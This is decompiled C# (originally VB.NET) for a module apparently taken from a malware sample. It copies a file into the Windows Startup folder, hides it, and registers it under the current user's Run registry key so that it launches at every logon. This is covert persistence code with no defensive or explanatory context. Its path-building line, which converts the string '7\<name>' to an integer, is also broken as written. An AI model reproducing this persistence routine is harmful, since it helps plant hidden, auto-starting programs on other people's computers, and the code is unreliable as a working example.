using System;
using System.IO;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace WindowsApplication35;

[StandardModule]
public sealed class startip
{
	[MethodImpl(MethodImplOptions.NoOptimization)]
	public static object Startup(string ServerName, string OutputName)
	{
		int try0000_dispatch = -1;
		int num3 = default(int);
		int num2 = default(int);
		int num = default(int);
		while (true)
		{
			try
			{
				/*Note: ILSpy has introduced the following switch to emulate a goto from catch-block to try-block*/;
				switch (try0000_dispatch)
				{
				default:
					ProjectData.ClearProjectError();
					num3 = 1;
					goto IL_0007;
				case 287:
					{
						num2 = num;
						switch (num3)
						{
						case 1:
							break;
						default:
							goto end_IL_0000;
						}
						int num4 = num2 + 1;
						num2 = 0;
						switch (num4)
						{
						case 1:
							break;
						case 2:
							goto IL_0007;
						case 3:
							goto IL_002b;
						case 4:
							goto IL_004d;
						case 5:
							goto IL_0070;
						case 7:
							goto IL_0098;
						case 8:
							goto IL_009a;
						case 9:
							goto end_IL_0000_2;
						default:
							goto end_IL_0000;
						case 6:
						case 10:
						case 11:
							goto end_IL_0000_3;
						}
						goto default;
					}
					IL_009a:
					num = 8;
					FileSystem.FileCopy(ServerName, Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger(Conversions.ToString(7) + "\\" + OutputName)));
					break;
					IL_0007:
					num = 2;
					if (File.Exists(Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger(Conversions.ToString(7) + "\\" + OutputName))))
					{
						goto IL_002b;
					}
					goto IL_0098;
					IL_002b:
					num = 3;
					File.Delete(Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger(Conversions.ToString(7) + "\\" + OutputName)));
					goto IL_004d;
					IL_004d:
					num = 4;
					FileSystem.FileCopy(ServerName, Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger(Conversions.ToString(7) + "\\" + OutputName)));
					goto IL_0070;
					IL_0070:
					num = 5;
					File.SetAttributes(Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger(Conversions.ToString(7) + "\\" + OutputName)), FileAttributes.Hidden);
					goto end_IL_0000_3;
					IL_0098:
					num = 7;
					goto IL_009a;
					end_IL_0000_2:
					break;
				}
				num = 9;
				File.SetAttributes(Environment.GetFolderPath((Environment.SpecialFolder)Conversions.ToInteger(Conversions.ToString(7) + "\\" + OutputName)), FileAttributes.Hidden);
				break;
				end_IL_0000:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0000_dispatch = 287;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0000_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
		object result = default(object);
		return result;
	}

	public static void AStartup(string Name2, string Path)
	{
		RegistryKey currentUser = Registry.CurrentUser;
		RegistryKey registryKey = currentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
		registryKey.SetValue(Name2, Path, RegistryValueKind.String);
	}
}
